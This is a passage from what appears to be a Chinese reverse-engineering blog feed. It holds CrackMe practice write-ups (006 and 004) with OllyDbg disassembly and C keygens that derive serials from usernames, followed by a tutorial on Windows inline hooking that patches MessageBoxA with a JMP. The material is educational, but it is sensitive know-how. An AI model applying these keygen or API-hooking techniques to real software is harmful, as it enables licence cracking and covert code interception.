class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">CancleClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodiceChange</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">int</span> serial)</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让cancle消失，通过用户名求出的serial\n&quot;</span>);<br><span class="hljs-keyword">int</span> serial = CancleClick(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;仅仅只是显示OK按钮\n&quot;</span>);<br>CodiceChange(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让OK消失，通过serial：%d\n求出的用户名\n&quot;</span>,serial);<br>OkClick(serial);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/10.png"></p><p>cancle按钮</p><p><img src="/2021/08/02/160CrackMe-006/11.png"></p><p>OK按钮</p><p><img src="/2021/08/02/160CrackMe-006/12.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>程序共有三个算法</p><ul><li>nomechange和codicechange里的，仅仅只是让OK亮起来</li><li>cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起</li><li>OKClick里的，让OK按钮消失</li></ul><p>不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序如下看到OK是不可点击的，是一个灰色按钮。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/02/160CrackMe-006/</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-004</title>
    <link href="https://b1ackie.cn/2021/07/29/160CrackMe-004/"/>
    <id>https://b1ackie.cn/2021/07/29/160CrackMe-004/</id>
    <published>2021-07-29T02:29:39.000Z</published>
    <updated>2021-08-09T10:53:54.343Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。</p><p><img src="/2021/07/29/160CrackMe-004/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用DIE查看一下，无壳，使用Delphi编写的。</p><p><img src="/2021/07/29/160CrackMe-004/2.png"></p><p>使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。</p><p><img src="/2021/07/29/160CrackMe-004/3.png"></p><p>下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。</p><p><img src="/2021/07/29/160CrackMe-004/4.png"></p><p>此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。</p><p>那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。</p><p>根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。</p><p><img src="/2021/07/29/160CrackMe-004/5.png"></p><p>下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。</p><p><img src="/2021/07/29/160CrackMe-004/6.png"></p><p>大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方</p><p><img src="/2021/07/29/160CrackMe-004/7.png"></p><p>看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码</p><p>而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457D2C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>]                  ;  输入的注册码<br><span class="hljs-attribute">00457D2F</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">93</span> <span class="hljs-number">18030000</span> mov edx,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">318</span>]                 ;  生成的<br><span class="hljs-attribute">00457D35</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">52</span>BFFAFF   call CKme.<span class="hljs-number">00403</span>C<span class="hljs-number">8</span>C<br><span class="hljs-attribute">00457D3A</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>A         jnz short CKme.<span class="hljs-number">00457</span>D<span class="hljs-number">46</span><br><span class="hljs-attribute">00457D3C</span>  |.  C<span class="hljs-number">783</span> <span class="hljs-number">0</span>C<span class="hljs-number">030000</span>&gt;mov dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>C],<span class="hljs-number">0</span>x<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/8.png"></p><p>这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457C66</span>  |.  <span class="hljs-number">8</span>BB<span class="hljs-number">3</span> F<span class="hljs-number">8020000</span> mov esi,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>F<span class="hljs-number">8</span>]                 ;  用户名长度<br><span class="hljs-attribute">00457C6C</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">6</span> <span class="hljs-number">05</span>       add esi,<span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                      ;  加上<span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">00457C6F</span>  |.  FFB<span class="hljs-number">3</span> <span class="hljs-number">10030000</span> push dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">310</span>]<br><span class="hljs-attribute">00457C75</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00457C78</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00457C7A</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">85</span>FEFAFF   call CKme.<span class="hljs-number">00407</span>B<span class="hljs-number">04</span>                               ;  转字符串（<span class="hljs-number">10</span>进制）<br></code></pre></div></td></tr></table></figure><p>这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行）</p><p>但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。</p><p><img src="/2021/07/29/160CrackMe-004/9.png"></p><p>然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。</p><p><img src="/2021/07/29/160CrackMe-004/10.png"></p><p>什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。</p><p><img src="/2021/07/29/160CrackMe-004/12.png"></p><p>那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name：\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>len += <span class="hljs-number">5</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注册码：\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;</span>, len, name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/13.png"></p><p><img src="/2021/07/29/160CrackMe-004/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/29/16</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>HOOK-Inline Hook</title>
    <link href="https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/"/>
    <id>https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/</id>
    <published>2021-07-28T03:17:15.000Z</published>
    <updated>2021-08-09T10:53:26.775Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h4><p>Inline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;这是本来的窗口&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/1.png"></p><p>进入函数可以看到函数的具体</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/2.png"></p><p>Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。</p><h4 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h4><p>通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。</p><p>如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00401160 </span>  . /E9 EF000000        jmp InlineHo.<span class="hljs-number">00401254</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/3.png"></p><p>JMP后的偏移计算公式是：</p><p>偏移=目的地址-原地址-5</p><p>5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。</p><p>想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span></span>;<br>FARPROC MessageBoxAAddress;<br>BYTE NewData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>,<span class="hljs-number">0</span> &#125;;<br>BYTE OldData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口1&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口2&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口3&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    <span class="hljs-comment">//保存原数据</span><br>    <span class="hljs-built_in">memcpy</span>(OldData, MessageBoxAAddress, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//计算需要跳转的偏移</span><br>    DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress  - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//写入新数据，跳转的偏移</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;NewData[<span class="hljs-number">1</span>], &amp;dwOffset, <span class="hljs-number">5</span>);<br><br>    DWORD dwOldprotect = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//修改页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect);<br>    <span class="hljs-comment">//写入五个字节</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, NewData, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//恢复页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldprotect, &amp;dwOldprotect);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    DWORD dwOldProtect = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//恢复原来的字节码</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, OldData, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span> </span>&#123;<br>    <span class="hljs-comment">//先恢复原来的字节码，然后调用正常的MessageboxA弹窗</span><br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-keyword">int</span> bRet = <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Inline Hook\ni am b1ackie!!!&quot;</span>, <span class="hljs-string">&quot;hook&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。</p><p>先是第一个正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/4.png"></p><p>然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/5.png"></p><p>第三个窗口再取消InlineHook后弹出正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/6.png"></p><p>现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/7.png"></p><p>跳过来看，就是我们自己编写的My_MessageBoxA函数</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00401170</span> &gt;/.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00401171</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00401173</span>  |.  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">00401176</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">04304100</span>   mov eax,dword ptr ds:[__security_cookie_fai&gt;<br><span class="hljs-attribute">0040117B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">5</span>          xor eax,ebp<br><span class="hljs-attribute">0040117D</span>  |.  <span class="hljs-number">8945</span> FC       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],eax<br><span class="hljs-attribute">00401180</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00401181</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">4</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">4</span>C                      ; /MessageBoxA<br><span class="hljs-attribute">00401186</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">581</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">58</span>                      ; |/user<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">0040118B</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.LoadLibraryA&gt;&gt;; |\LoadLibraryA<br><span class="hljs-attribute">00401191</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |hModule = <span 